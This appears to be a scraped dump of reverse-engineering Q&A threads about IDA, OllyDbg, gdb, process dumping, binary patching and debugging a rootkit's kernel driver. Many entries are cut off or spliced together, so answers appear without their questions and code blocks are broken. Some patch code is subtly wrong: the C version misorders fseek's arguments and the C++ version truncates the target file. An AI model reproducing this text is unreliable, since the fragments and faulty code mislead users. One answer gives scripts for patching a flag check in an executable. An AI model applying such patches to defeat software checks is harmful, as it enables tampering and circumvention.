<li>Monitor <code>LoadLibrary</code> for a chance someone trying to load unknown module into your process.</li>
</ol>

<p><strong>Injected code without thread</strong></p>

<ol start=""10"">
<li><p>Check the integrity of your process - look for hot patching of various APIs, depends on the process. Injected code could be triggered by some patch inside current process.</p></li>
<li><p>Monitor APC creating API <a href=""http://www.cs.miami.edu/~burt/journal/NT/processinit.html"" rel=""nofollow noreferrer"">(<code>KiUserApcDispatcher</code>)</a> if the target code belongs to current process. OS's APC also could be filtered out.</p></li>
</ol>

<p>There are other ways to inject code, even before the legit process will start to run and place its protections - using combination of <code>WriteProcessMemory</code>/<code>GetThreadContext</code>/<code>SetThreadContext</code> which theoretically could bypass all your implemented protections. When your code and injected one are only running in the same ring (user mode), it all goes down to who is gaining control first. Look for <a href=""http://resources.infosecinstitute.com/code-injection-techniques/"" rel=""nofollow noreferrer"">code cave method</a> and think for example when malcode is injected into explorer.exe and you are starting your program :-).</p>

<p>Of cause, you can load your driver into kernel, which will give you more solid control over the code injection to your process and a good protection, but that of cause depends on the skills and what you are trying to protect.</p>

"Using IDA cross platform: VM, Wine, other options?","1977","","<p>I'm looking to buy an IDA Pro license for my own home use. However, I use all three supported platforms: Windows and Linux on desktop, and OS X on a laptop. I can't afford more than one license, so I'm interested to see if other people have been in a similar situation and how they solved it. </p>

<p>My initial thoughts on each version:</p>

<ul>
<li>Mac OS X: I use my laptop most often, but reversing on a 13"" screen isn't always fun, I would not be able to use the Mac version on either Windows or Linux.</li>
<li>Windows: I've heard good things about running the Windows version in Wine on Mac and Linux, or even in a VM.</li>
<li>Linux: I almost always have a Linux VM even when I'm on Mac or Windows, so I could always install IDA in a VM.</li>
</ul>

<p>I'm leaning towards the Windows or Linux versions to be able to use anywhere, but I've never used IDA in a non-native environment, so I'm somewhat concerned about keyboard shortcuts and integration.</p>

<p>Any suggestions on a good way to go?</p>
","<p>Your IDA Pro license allows you to install IDA on two desktops and one laptop. You might want to check the license situation if you install IDA in a ""portable/VM"" environment, but only Hex-Rays can give you definite information here. So i'm omitting that part from my answer. (Some Hex-Rays employees frequent this site as well).</p>

<p>This depends a lot on your use case. How often do you want to do some reversing work when you have your laptop, but don't have access to your (Windows/Linux) desktop?</p>

<p>When i'm using IDA, i want to have a lot of screen estate for it, and don't generally need much screen for the debugee. Which generally means you want IDA on your host OS, and the debugee in the guest OS, as you'll always be able to access the whole screen on the host, but maybe not in the guest, especially in multi-monitor-configurations.</p>

<p>Personally, i have the Linux version, and while Linux is my main desktop environment, i needed to use IDA at a customer once, that allowed only Windows in their network. I was allowed to install VirtualBox and run Linux in that VirtualBox (Host only network, no access from Linux to their net), and my IDA worked very well, using the ""remote debugger"" to debug stuff running on the host. So while i did miss my big screen, i was able to work without any hassle regarding keyboard shortcuts, inability to do what i needed, or crashes.</p>

<p>So, if you're travelling and working on your Mac laptop 95% of your time, i'd buy the Mac version if i were you, and debug Linux/Windows programs in VMs. If you're have access to desktop most of the time, and consider IDA on the Mac a kind of ""emergency mode"", get the version for the OS you use on your desktop most, and install a VM with IDA inside it on the Mac. In this case it shouldn't matter much if that OS is Windows or Linux.</p>

<p>Trivial method would be to check every function's call list and if it calls itself then it's recursive. I'ld like to put a comment or some kind of indicator that would help me distinguish these functions. </p>
","<p>It is not trivial task. You can do it relatively easy if you not taking in account indirect calls (for example such as virtual functions in C++) and calls from another function like this:</p>

    f();

</code></pre>

<p>It can be much more complicated if one of your functions is in another binary (dll for example). So, there are two ways to do it, a static and a dynamic way.</p>

<h3> </h3>

<h3>Recursive assembly traversal - static analysis approach</h3>

<p>You should write the script in IDAPython that passes over the function,
and recursively processes each call. If you find current function in collected stack the function is recursive.</p>

<p>Very simple variant looks like this:</p>

<pre><code># I didn't check it, use carefully, beware the errors in this code
import idautils
import idc
import idaapi

def handle_function(func_start):
    global stack
    if func_start in stack:
        print ""This is recursive function"", hex(func_start), Name(func_start)
        for x in stack:
            print ""\t"", hex(x)
        #insert your renaming here, it should be idc.MakeName
        return

    stack.append(func_start)
    for h in idautils.FuncItems(func_start):
        for r in idautils.XrefsFrom(h, 0):
            if r.type == fl_CF or r.type == fl_CN:
                print hex(h), ""--&gt;"", hex(r.to)
                if r.to == func_start:
                    # Insert renaming here too for simple recursion
                    print ""It is simple recursive function that calls itself directly""
                    return
                else:
                    handle_function(r.to)
    stack = stack[:-1]

for f in idautils.Functions():
    stack = []
    handle_function(f)
</code></pre>

<h3> </h3>

<h3>Breakpoint analysis - dynamic analysis approach</h3>

<p>Write script in IDAPython that recognizes all function prologues and filters out all functions that doesn't call anything. 
Put breakpoint on each collected prologue and run the program.
Each time the program stops, analyze stack of the program using IDAPython in order to find function you are stopped on in the stack. If you find it, the function is recursive. </p>

  <p>Is there a way to go into the thread function, knowing only the thread
  handle?</p>
</blockquote>

<p>Yes, it's a 2-step process.</p>

<p><strong>Step 1 - Convert the thread handle to a thread ID</strong></p>

<p>In <a href=""https://technet.microsoft.com/en-us/sysinternals/bb896653.aspx"" rel=""nofollow noreferrer"">Process Explorer</a>'s menu bar, check the following:</p>

<ul>
<li><em>View</em> → <em>Show Lower Pane</em></li>
<li><em>View</em> → <em>Lower Pane View</em> → <em>Handles</em></li>
<li><em>View</em> → <em>Select Columns...</em> → <em>Handle</em> tab → check all checkboxes</li>
</ul>

<p>Next, select your target process in Process Explorer's list of processes. You'll then see in the lower pane the list of handles for that process, including thread handles. Find the thread ID associated with your target handle. For the example below, thread handle <code>0x228</code> is associated with thread ID <code>3000</code>:</p>

<p><img src=""https://i.stack.imgur.com/mddAT.png"" alt=""Handle to ID""></p>

<p>Though handle values are shown in hexadecimal in Process Explorer, thread IDs are shown in decimal. Thus thread ID <code>3000</code> in decimal is equal to thread ID <code>0xBB8</code> in hexadecimal.</p>

<p><strong>Step 2 - Find EIP for the thread ID</strong></p>

<p>In OllyDbg's menu bar, select <em>View</em> → <em>Threads</em>. Right-click on the thread whose <em>Ident</em> corresponds to the thread ID you found in Step 1 (<code>0xBB8</code> in the example below), and select <em>Show registers</em>:</p>

<p><img src=""https://i.imgur.com/Z10x3sX.png"" alt=""Threads""></p>

<p>This will show you the current <code>EIP</code> for that thread, which is the next instruction to be executed once that thread is resumed:</p>

<p><img src=""https://i.stack.imgur.com/iKgc4.png"" alt=""Registers""></p>

<p><strong><em>Alternative</em> Step 2 - Find EIP for the thread ID</strong></p>

<p>If the target thread was created in a suspended state and not yet resumed then the thread won't show up in OllyDbg's thread window. In this case, you can use <a href=""https://technet.microsoft.com/en-us/sysinternals/bb897415.aspx"" rel=""nofollow noreferrer"">LiveKd</a> to find the thread's starting address by issuing the LiveKd command <code>!thread -t &lt;thread ID in hexadecimal&gt;</code></p>

<p>While I do understand the for rax, rcx etc, GDB is converting the value to decimal for the second column, this doesn't seem consistent. Some registers, namely rsp and rip show the same value in hex, even in the second column. eflags on the other hand shows the flags in the second column.</p>

<p>What is the reason that gdb does this? If it is going to show the same info (in case of rsp and rip), isn't it redundant? Also, how does this generalize on other architectures? (The above output is for x86-64).</p>

<p><a href=""https://stackoverflow.com/questions/31026000/gdb-info-registers-command-second-column-of-output"">Source</a>. I re-asked this question since I thought I would find more specific answer in reverse engineering point of view.</p>
","<p>In fact, in assembly you can find only three types of values:</p>

<ol>
<li>Numerical values;</li>
<li>Memory addresses;</li>
<li>Instructions (opcodes).</li>
</ol>

<p>General purpose registers, such as <code>rax</code>, <code>rbx</code>, ..., are used to store either numerical values (that will trigger the behavior of the program) or memory addresses (to know where to read/write or to jump).</p>

<p>Of course, as most of human beings are used to decimal format for the values used in programs, it is important to display a decimal format when the register might contain such values.</p>

<p>Now, it is important to know that memory addresses are usually given in hexadecimal format (mainly for compactness reasons). And, general purpose registers might also contain memory addresses. That is why <code>gdb</code> display both decimal and hexadecimal formats just in case one or the other is the best suitable for the current value.</p>

<p>The registers <code>rsp</code>, <code>rip</code> (and <code>rbp</code>) are special cases because they are specifically used to store addresses (and only this), thus it would be of no use to translate the content of such registers into decimal format. That is why <code>gdb</code> is only giving an hexadecimal format for these registers.</p>

<p>Finally, the case of the <code>rflags</code>/<code>eflags</code> is a bit special because this register has a meaning that is bit-per-bit dependent (see the following figure).</p>

<p><img src=""https://i.stack.imgur.com/slUoN.png"" alt=""EFLAGS bit-per-bit details""></p>

<p>Therefore, giving the decimal, hexadecimal or binary format is not really useful to the user (except if you can relate the numbers to the flags instantly). But, it is much more useful to give the list of flags that are set as 'true' (this is the <code>[ IF ]</code> that you see in your example). Yet, <code>gdb</code> gives the hexadecimal value of the <code>eflags</code> as it can be accessed and used as a value in programs (I have seen this for obfuscation purpose).</p>

"Process Dumping and Ida","1947","","<p>Up until now I've been performing static analysis using Ida and run time analysis using OllyDBG.</p>

<p>I've heard of dumping a process to memory, then performing static analysis on that dump file - would this make sense in the current context?</p>

<p>What differences would there be compared to just looking at the executable? </p>

<p>Does the software used to dump the process effect it's structure - are there different types of process dumps?</p>

<p>How would I actually go about opening the dump file in Ida?</p>
","<p>If your binary is allocating a new memory page &amp; writing code on it, that's something you won't see on the static binary. Performing a full dump of the process from memory and loading this new binary into IDA will indeed show you those new parts. The data has to come from somewhere though (ressource, compressed, encrypted, another file, Internet, etc).</p>

<p>As you mentioning that the binary appears to be neither packed nor obfuscated, be sure to check you're not just into one of the loaded DLL of your binary (reversing one of the imported DLL might not be what you're willing to do?).</p>

"How much Cryptography knowledge is important for reverse engineering?","1928","","<p>Is understanding of Cryptography really important for a reverse engineer? </p>

<p>Thanks.</p>
","<p>It is more and more important for practical reverse-engineering. It is now present in malware, the example of Stuxnet, Flame and others are quite typical of the usage of cryptography in such context. And, it is also present in most protection schemes because a lot of techniques use cryptography to protect the code and data. Just consider software such as Skype or iTunes which are relying on cryptography to protect their protocol or to hide information in the executable.</p>

<p>So, indeed, it would be really a problem if you do <strong>not</strong> understand a bit cryptography when reversing. And, by ""<em>understanding cryptography</em>"", I mean at least to be able to recognize the code of classical cipher algorithms at assembly level such as DES, AES, SHA-1, SHA-3, and so on. And, also to know classical flaws and cryptanalysis techniques for weak crypto (such as frequency analysis).</p>

<p>A good way to learn about the cryptography needed for reverse-engineering would be to implement (with the help of existing codes found on the Net) your own cryptographic library with classical ciphers and look at the generated assembly. If you do not have the patience to do so, just look at the crypto-lib of <a href=""http://www.openssl.org/source/"" rel=""nofollow"">OpenSSL</a>, get it compiled and look at the code and the assembly.</p>

<p>Of course, more you know about it, more you will be efficient when facing it.</p>

my_op_phrase[1].type #-&gt; idaapi.o_imm

my_op_phrase[2] #-&gt; 'var_3F8'
…
</code></pre>

<p>Is this even possible or am I misunderstanding something?</p>
","<p>Note that the original assembly instruction was <em>probably</em> <code>mov [rsp+4], 0</code>(*). This is why <code>idc.GetOperandValue</code> returns 4.</p>

<p>Especially with older compilers, that used <code>push</code> and <code>pop</code> a lot, the value of <code>rsp</code> varies wildly during the execution of a function. What is <code>esp+8</code> now would be <code>esp+12</code> after a push; what would be <code>rsp+8</code> now would be <code>rsp</code> after a pop. So, while reading a piece of (plain) assembly code it's very difficult to keep track of which stack location gets accessed when.</p>

<p>(This has improveed recently; x64 abis use registers to pass parameters so the code doesn't <code>push</code> and <code>pop</code> as much anymore, and compilers like <code>gcc</code> make enough space on the stack and directly put parameters in addresses relative to <code>esp</code> even on 32 bit, so <code>esp</code>/<code>rsp</code> don't change that much anymore. But still, there's a lot of old code to reverse.)</p>

<p>To improve the situation, IDA assigns variable names to stack locations, like your <code>var_3F8</code>. Whenever an instruction does some <code>sp</code> relative addressing, IDA uses the variable name, and emits an additional offset to account for changes to the stack pointer since the function start. So if your original code looks like</p>

<pre><code>mov [rsp+8], rax
sub rsp, 128
mov [rsp+136], rbx
push rcx
mov [rsp+144], rdx
</code></pre>

<p>it accesses the same memory address in every case. Ida converts this to</p>

<pre><code>mov [rsp+0+var_8], rax
sub rsp, 128
mov [rsp+128+var_8], rbx
push rcx
mov [rsp+136+var_8], rdx
</code></pre>

<p>However, these changes are display only, they do not change your binary! Getting the operands will still return <code>8</code>, <code>136</code> and <code>144</code>, not the values ida displays to you.</p>

<p>If you want to analyze this automatically, you can <em>either</em> keep track of the stack pointer offset yourself, and adjust the result of <code>GetOperandValue</code> accordingly, <em>or</em> you'll have to use the python string functions on the output of <code>GetOpnd</code>, throw away the middle part, and compare the right part (the variable names).</p>

<p>(*) which seems a bit strange now i think of it, since you're obviously using 64 bit, as your stack pointer is <code>rsp</code>, which would hint at 8 byte alignment.</p>

"IDA Pro: use structs on parameters","1926","","<p>I have a small function that is given a <code>struct</code> as parameters. The <code>struct</code> looks to something like this:</p>

<p>Taking care of the alignment I build the following <code>struct</code> in IDA:</p>

<pre><code>field_0 +0x0

<p>The compiler builds it so that it takes <code>rbp+0x10</code> as the first field in the <code>struct</code>, <code>rbp+0x14</code> as the second and so on. The problem now arises because if I try to apply the pre-defined IDA <code>struct</code> to the instructions, I always get something like <code>[rbp+struct.field_0+0x10]</code>. This get more complicated if there is actually something in my struct at <code>+0x10</code>, because then it just shows <code>[rbp+struct_fieldX]</code> (which is wrong).</p>

<p>The question is: <em>Is there a way to tell IDA (I'm using 6.3) to apply the <code>struct</code> with an offset of <code>0x10</code>?</em> </p>

<pre><code>xor eax, eax

<p>It describes how to debug a remote process running on Windows. But in my case, it is not a process but a shellcode loaded from a text file.</p>
","<p>For testing shellcode on windows and in general, it's good idea to wrap it in a small program that executes it. </p>

<p>What you could do is write a small program that would read the shellcode, say , from a file into malloc()-ed buffer and then jump to it. </p>

<p>On windows, you'd probably want to use <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa366898%28v=vs.85%29.aspx"">VirtualProtect</a> to set PAGE_EXECUTE_READWRITE permissions on that memory area before jumping to it. </p>

<p>After reading shellcode into malloced memory and setting the execute permissions, you can simply use function pointer to call/jump to it. </p>

<p>This will produce the executable binary which you can run in any debugger, set the breakpoint just before the function pointer call and then debug the shellcode as you wish.</p>

<p>A quick search reveals just a program like that in an article about <a href=""http://mcdermottcybersecurity.com/articles/windows-x64-shellcode#testing"">Windows x64 Shellcode</a>. The same code can be applied on 32bit Windows.</p>

"Segments in IDA. How to overcome NONAME problem","1919","","<p>I'm disassembling a packed 16 bit DOS MZ EXE.</p>

<p>To deobfuscate it, I've set a breakpoint in DOSbox at the end of the unpacking routine, let it run, and made a memory dump. This way I essentially got the deobfuscated EXE image.</p>

<p>Problems started when I loaded the image in IDA. You see, I don't understand the IDA's concept of segments. They are similar to x86 segments, but there are numerous differences which I can't grasp. When IDA asked me to create at least one segment, I just made a single huge segment 1 MB length, because the code and data in program's address space are mixed and it doesn't make sense to introduce separate segments such as <code>CODE</code>, <code>DATA</code> etc. </p>

<p>After showing IDA the entry point, everything worked fine: IDA successfully determined functions, local variables, arguments etc. The only problem is that some calls are marked as <code>NONAME</code>, even though they point at correct subroutines. The strangest thing is that those subroutines have correct XREFs to the 'illegal' calls. Here's an example:</p>

<pre><code>seg000:188FF 004                 call    1AD9h:1         ; Call Procedure
</code></pre>

<p>This line is red and has an associated <code>NONAME</code> problem in Problems List. Why?</p>

<p>The <code>1AD9h:1</code> seg:offset address corresponds to linear address <code>0x1ad91</code>, which has this:</p>

<pre><code>seg000:1AD91     ; =============== S U B R O U T I N E =======================================
seg000:1AD91
seg000:1AD91     ; Attributes: bp-based frame
seg000:1AD91
seg000:1AD91     sub_1AD91       proc far                ; CODE XREF: sub_188F2+DP
</code></pre>

<p>Note the XREF. So IDA actually processes the call correctly! Why is the call considered invalid? IDA help file says this:</p>

<blockquote>
  <h2>Problem: Can not find name</h2>
  
  <p><strong>Description</strong></p>
  
  <p>Two reasons can cause this problem:</p>
  
  <ol>
  <li>Reference to an illegal address is made in the program being
  disassembled;</li>
  <li>IDA couldn't find a name for the address but it must exist. </li>
  </ol>
  
  <p><strong>What to do</strong></p>
  
  <ol>
  <li><p>If this problem is caused by a reference to an illegal address</p>
  
  <ul>
  <li>Try to enter the operand manually</li>
  <li>Or <strong>make the illegal address legal by creating a new segment</strong>.</li>
  </ul></li>
  <li><p>Otherwise, the database is corrupt.</p></li>
  </ol>
</blockquote>

<p>So, I guess the problem is that I have one gargantuan segment instead of several small ones. But, how do I properly divide the address space into appropriate segments? </p>

<p>I know the register values (including <code>DS</code>, <code>CS</code>, <code>SS</code>, <code>IP</code>, etc) at the entry point. Let's assume I create a <code>CODE</code> segment starting from the segment corresponding to the CS register value at the entry point. But what length should this segment have ?</p>

<p>What's the point of segments in IDA at all? If DATA segments can contain instructions, and CODE segments can be read and written as data?</p>

<p>Please excuse me for such a newbie question, but official IDA manual is notoriously scarce and HexRays forums are closed for me because I use freeware version. </p>

","<p>The <code>!</code> denotes <em>writeback of the base register</em>. <strong>Base register</strong> is the register used to address the memory to be read or written - in your case it's <code>R4</code>. <strong>Writeback</strong> means that the base register will be updated with the delta equal to the size of transferred data.</p>

<p>So, the instruction </p>

<pre><code>ldm r4!, {r0, r1, r2, r3}

<p>So I tried extracting the data inside the installer PE. I tried pestudio which showed me two large embedded resources, however, pestudio had no option to dump them. Extracting the PE with 7-zip shows a file with the name <code>~102</code>.</p>

<p>However, 7zip cannot make out anything out of the <code>~102</code> file. Viewing this file with a hex editor shows that it is a tar archive with around 20 bytes of additional info prepended to it. Removing these 20 bytes does not make it extractable, however.</p>

<p>How can I extract the files from the binary?</p>

<p>I'm a complete noob in reverse engineering, so please correct my mistakes instead of downvoting my question. I'd also be grateful if someone can tell me of a tool which can extract such data from PE executables (instead of my very questionable use of 7-zip for this purpose which also fails for a large number of executables).</p>
","<p>I ran the installer through an online EXE inspector which told me the <code>102</code> resource contained <em>LZMA compressed data</em>. <sup>Stupidly, I closed that window to look up what 'LZMA' is. I forgot to note the URL of this specific tool, and now I cannot find it anymore! Such a shame because this hint was <em>crucial</em>.</sup></p>

<p>I then ran it through <a href=""http://pedump.me"" rel=""nofollow"">PEdump.me</a>, which allows one to download it separately. To unpack the LZMA compression, I used Stuffit Expander (for OS X), but you can probably use 7-Zip as well -- you may need to add the file extension <code>.lzma</code> to make it work.</p>

<p>This gave me a <em>TAR-like</em> file, containing a few more executables. My local <code>tar</code> was unable to unpack it any further (possibly it's some variant of the standard <code>tar</code>).</p>

<p>The TAR file format is a wrapper to concatenate multiple files into one; its headers contain the original file name and its size, amongst other data. TAR does <em>not</em> apply compression to the resulting file, so you only need a good hex editor to manually split it into the separate programs.</p>

<p>Being able to show the <a href=""http://msdn.microsoft.com/en-us/magazine/cc301805.aspx"" rel=""nofollow"">PE Sections</a> of a Windows executable is a rather uncommon function for a general compressing/uncompressing program... That said: I have found no fault in 7-zip's handling of PE executables. It splits them up into their sections and does nothing more.</p>

<p>You can use a tool such as PE Studio to <em>inspect</em> the resources (are you sure it cannot extract them? It seems such a basic function); but after extracting them, you are on your own. There is no ""standard"" way of compressing or otherwise obfuscating resources; some programs may even contain custom code to extract their own data.</p>

<p>Recognizing the format of a resource is then reduced to the more general ""recognize the file format"", which is an extremely broad topic on its own.</p>

"OllyDBG, managed to patch file, now can I automate this?","1869","","<p>In Olly I managed to patch the file to no longer compare for a specific flag. Is it possible to automate this?</p>

<p>Basically I changed a JNZ to a JZ.</p>

<p>Is there a way to could do the same thing with a hex editor? </p>

<p>The end goal would be to create a program to automate this patch.</p>

<p>Thanks.</p>
","<p>Okay, I suppose you just want to create a program that patches the already existing file, so here's how I'd do it.</p>

<hr>

<p>First, you need the offset in the file.
That means that offset 0 is the first byte, 1 is the second, etc, as opposed to the offset + base which you see in memory.</p>

<p>To get that offset, right click the instruction, and go to <code>View &gt; Executable file</code>:</p>

<p><img src=""https://i.stack.imgur.com/tY5VJ.png"" alt=""executable file (to get the offset)""></p>

<p>And you take the offset:</p>

<p><img src=""https://i.stack.imgur.com/64kFD.png"" alt=""relative offset""></p>

<p>which is <code>0x16A7</code> in my case.</p>

<hr>

<p>Once you have the offset, you must code a program to patch the program.
Here's a few ways: (I only tested the Python one, but the rest should work)</p>

<h1>C++</h1>

<pre><code>#include &lt;iostream&gt;
#include &lt;fstream&gt;

int main() {
    std::ofstream f(""file_to_patch.exe"", std::ios::binary);
    // seek to the desired offset
    f.seekp(0x16A7);
    // \x74 to \xEB, for example (conditional short to unconditional short)
    const char bytes[] = ""\xEB"";
    f.write(bytes, sizeof(bytes));
    f.close();
    return 0;
}
</code></pre>

<h1>C</h1>

<pre><code>#include &lt;stdio.h&gt;

int main(void) {
    FILE* f = fopen(""to_patch.exe"", ""r+b""); // open
    fseek(f, 0, 0x16A7); // seek to the offset to patch
    fwrite((void*) ""\xEB"", 1, 1, f);
    fclose(f);
    return 0;
}
</code></pre>

<h1>Python</h1>

<p>In case you want to script it and don't wanna bother with C / C++, here's how you do it with Python:</p>

<pre><code>f = open(""to_patch"", ""r+b"") # open in read/write binary
f.seek(0x16A7) # seek to the previously found offset
f.write(bytearray([0xEB])) # patch the jump
f.close()

"How to break on not-yet-loaded kernel driver","1868","","<p>I've been reversing a sample of the Uroborus trojan for my own learning joy. I'm having a hard time following it once it loads a windows kernel driver that implements the rootkit.  I've set up my environment for Kernel debugging (using IDA's windbg plugin) and set a breakpoint for the new driver (it's called Fdisk.sys, so I've been typing ""bu fdisk.sys!DriverEntry"").  However, IDA never breaks when the driver is loaded. I can tell that it has run because it starts hiding a registry key (Ultra3), and dumping the memory and using Volatility to look at unloaded modules, I can see that fdisk.sys was unloaded.  I can also confirm that it's installed hooks into a number of kernel API's.  How do I get IDA/windbg to break on the driver before it gets to run? </p>
","<p>For some reason I have yet to determine, every effort to set a breakpoint on this module by name (fdisk.sys) is failing.  The driver isn't loaded at bootup (at least, not at the point that I'm investigating right now).  It's loaded by a module and then unloaded again fairly soon thereafter. </p>

<p>I finally used a debugger (indside my VM) to step through the module that launches the driver, stopped execution after the file was written to disk, and used a hex editor to change the first instruction to INT 3.  That worked; when the driver loads the exception is caught by the kernel debugger and I'm able to start reviewing.  <em>phew</em></p>

"Why are there (sometimes major) differences between java source code and its decompiled result?","1857","","<p>I compiled some [relatively complex] Java code into a .class file, then used jad to decompile it back into java. Of course, the code was obfuscated, which was to be expected. However, given that I had the original code, I thought I'd be able to look through the decompiled code fairly easily. However, I noticed differences in the code, such as where certain variables were defined (including differences of scope).</p>

<p>Is there any main reason for this? I imagine it's one of those things that just happen in decompilation of code, but I'm more curious about what factors cause the change (e.g. complexity of code, whether it refers to other files, etc.).</p>

<p>Could someone provide me with a good explanation on what factors cause the differences in the code before and after?</p>

<h3>Edit</h3>

<p>Technically, the .class file is pulled from a jar. I extracted the contents and used the .class file in there.</p>

<p>As far as which obfuscator I used, I used the Retroguard obfuscator with the following options (I'm currently just exploring obfuscation and finding out what each thing does to the final result):</p>

<pre><code>.option Application
.option Applet
.option Repackage
.option Annotations

It's a little unorganized, but you should be able to find adequate explanations in there. It's also noteworthy that I stripped the generics and the local variable table.</p>

<p>I have now also set up a way (inspired by the creators of the Minecraft Coder Pack) to rename the sources using data from a file (or files), which is passed to a dictionary of lists for packages, classes, methods, and fields.</p>

"Capturing OS/hardware communication / reverse engineering drivers","1838","","<p>My main question is how the open source community reverse engineers windows drivers (for say, video cards) to re-write them under linux.</p>

<p>Links to resources are fine, I don't expect a tutorial on driver development in an answer. But at least I need to be pointed in the right direction.</p>

<p>This is actually have been asked in other stackoverflow sub domain.However, the original writer doesn't get the correct answer and i also want to know about this reverse engineering method. I hope this question is not considered as duplicate one.</p>
","<p>It depends on the particular interface, but the general idea is often the same and usually does <strong>NOT</strong> involve disassembling the driver.  The reason is that the disassembling method for reverse engineering is not considered legal in all jurisdictions.  Here are the usual steps:</p>

<h1>1. Contact the manufacturer for needed information</h1>

<p>Obviously, the most direct approach is also the easiest if successful.  Some manufacturers are more cooperative than others.  For some types of devices, even if the manufacturer of a device is uncooperative, sometimes the manufacturer of major chips on the device are willing to share some information and this can help.</p>

<h1>2. Get general information about the device by observation</h1>

<p>A lot of information can be obtained simply by observation.  For example, what are the major components in the device?  Can we look up part numbers and find datasheets for them?  Is this version <em>n+1</em> and there is already a version <em>n</em> driver for Linux?  Does the manual or the Windows driver user interface give any important clues about registers, settings or capabilities?  Does the Windows driver support multiple devices? This can be an indication that the devices might be similar, and if there's a Linux driver for one of them already, it can help.</p>

<h1>3. Capture communications with the device for analysis</h1>

<p>For some devices such as serial ports or USB, capturing the communications between the device driver and device is usually fairly straightforward.  (See <a href=""https://reverseengineering.stackexchange.com/questions/2416/how-to-reverse-engineer-simple-usb-device-windows-linux?rq=1"">How to reverse engineer simple usb device [windows -&gt; linux]</a>) Capturing communications for video cards can be done in a couple of ways. One way it can be done is by using a proprietary Linux driver and then intercepting calls for that, as with the <a href=""http://nouveau.freedesktop.org/wiki/REnouveau/"" rel=""nofollow noreferrer"">REnouveau</a> tool. Sharing data is important, and is one reason so many drivers have been successfully written for Linux. One of the major strengths of the open source community is the fact that there are people all over the world who can and do collaborate with such efforts. </p>

<h1>4. Attempt to duplicate the communications under Linux</h1>

<p>This is a matter of writing code and trying the result. Because Linux already has a rich set of drivers, it's often easiest to start with something similar and modify it.  Since everything is open source, tinkering is not merely allowed but encouraged! For devices other than video cards, one can often write userspace code to attempt to exercise the device and to gather data and try experiments. Ultimately, a real driver is written, ideally as a kernel module, to allow unloading and reloading. This speeds the development cycle over having to reboot after any driver change (I'm looking at <strong>YOU</strong>, Windows!) </p>

<h1>5. Test extensively</h1>

<p>Testing and bugfixing is important for open source software generally, and that certainly applies to device drivers as well as anything else.  First, for inclusion in the kernel, other developers look at the code in a sometimes brutal but invariably useful process called code review.  Other experienced developers look at the source code and point out weaknesses in the code, flaws in assumptions and even typos in comments and formatting problems. Once enough people have done that, people with the actual device in question actually try it on their hardware and report bugs or anomalies. This often turns up issues such as version differences (e.g. there were multiple versions of the physical device, but all sold as the same thing) and device conflicts (both device A and device B work great individually, but fail when both are connected).</p>

<p>Ultimately, the result is a shiny new bug-free open source driver that everyone can use.  (Or that's the goal, anyway!)</p>

<p><strong>Edit 1</strong>
After looking at the code for a while longer I realized the xor is happening on eax to ""0"" it out, does that happen so that a return value can be stored into eax?</p>
","<p>The code between <code>80484c5</code> and <code>80484ce</code> sets up the <a href=""https://reverseengineering.stackexchange.com/questions/6627/segmentation-on-x86-for-stack-canaries"">stack canary</a>, and <code>80484e7</code> to <code>80484f3</code> checks it. gcc omits the stack checking from your second function, since it can determine (uses no pointers, doesn't call subroutines) that there's no way to overwrite the stack here. Your <code>xor eax, eax</code> isn't neccesary per se (you don't need to zero registers before storing something into them), it's just that the compiler wants to make the canary value unknown as soon as possible.</p>

<p>Omitting the stack checking results in:</p>

<pre><code>0x080484d0 &lt;+17&gt;:    sub    esp,0x8            // adjust stack alignment 
0x080484d3 &lt;+20&gt;:    lea    eax,[ebp-0x10]     // move the address of maxRow into eax
0x080484d6 &lt;+23&gt;:    push   eax                // and push it on the stack as the 2nd function argument
0x080484d7 &lt;+24&gt;:    push   0x80485b0          // Push the address of your format string as first function argument
0x080484dc &lt;+29&gt;:    call   0x8048380 &lt;__isoc99_scanf@plt&gt;  // call scanf
0x080484e1 &lt;+34&gt;:    add    esp,0x10           // remove the added bytes from the stack
0x080484e4 &lt;+37&gt;:    mov    eax,DWORD PTR [ebp-0x10]  // get the content of maxRow into eax to return it as function return value
</code></pre>

<p>3 things might need further explanation:</p>

<ul>
<li>The <code>lea</code> instruction calculates an <em>address</em>, while <code>mov</code> loads a value. Thus, <code>lea eax,[ebp-0x10]</code> is like  <code>eax=&amp;maxRow</code>, and <code>mov eax, DWORD PTR [ebp-0x10]</code> is like <code>eax=maxRow</code>.</li>
<li>In C, function arguments are pushed from behind, i.e. the last argument gets pushed first. This ensures the first argument is always at the same position, which is important for <code>varargs</code> functions like <code>printf</code> and <code>scanf</code>.</li>
<li>Since 2 arguments are passed, which needs 8 bytes, ommiting the first <code>sub esp,0x8</code> and replacing the <code>add esp,0x10</code> with <code>add esp, 0x8</code> would be more straightforward. The reason <code>gcc</code> spends these extra bytes is probably that it wants the stack pointer aligned to a multiple of 16 bytes, which speeds up certain things. Not sure about this however, since the total distance between <code>esp</code> at the start of your function and <code>esp</code> at the start of <code>scanf</code> doesn't seem to be a multiple of 16.</li>

<p>which is correct, but as seen above, IDA is still showing too many args.</p>
","<p>I would define a vtable struct which has the correct function pointers in it. I assume this is an <code>IDirectDrawSurfaceX</code>? The variable named <code>v17-&gt;lpVtbl</code> needs to have a type of  <code>IDirectDrawSurfaceX *</code>. Create this structure of function pointers according to the interface definition on MSDN or load it from a standard structures if IDA has imported the DirectX C interface definitions. Set the type of the <code>v17-&gt;lpVtbl</code> by pressing <kbd>y</kbd> on the definition of lpVtbl in whatever structure type <code>v17</code> is. Then you may need to force the type of the function pointer call to the type of the interface member used in the vtable. You do this by right clicking the call site and choosing <code>Force call type</code>.</p>

"How to reverse command line arguments?","1832","","<p>I am working on a console windows executable. So far what I figured out is that the executable checks number of command line arguments. Afterwards, it branches out depending on the number of arguments passed (argv). The jumps are looked up using some sorts of jump table, which is constructed dynamically. It seems to be a daunting task try to figure out all of the possible command line arguments. It looks like the binary only executes only when certain number of particular arguments is parsed. I have collected some possible options using <code>strings</code> utility. </p>

<p>Is there a general road map for reversing command line arguments? What are possible approaches to reversing them? Are there any tools that could be employed?</p>
","<p>if you determined the argv and argc and values in there you gone half of the way . from value of argc you can understand how many arguments you should pass and from values in argv you can determine what you ""should"" pass.</p>

<p>now as you can see we have another compare here this time using strcmp and before that we will push our str and <code>arg_4</code> and here is our actual argument vector . </p>

<p>you can really easily analysis arguments using static and dynamic analysis but there is a few notes you have to keep in your mind .</p>

<ol>
<li>how many arguments we have to pass</li>
<li>type of arguments</li>
<li>location of arguments (argv)</li>
</ol>

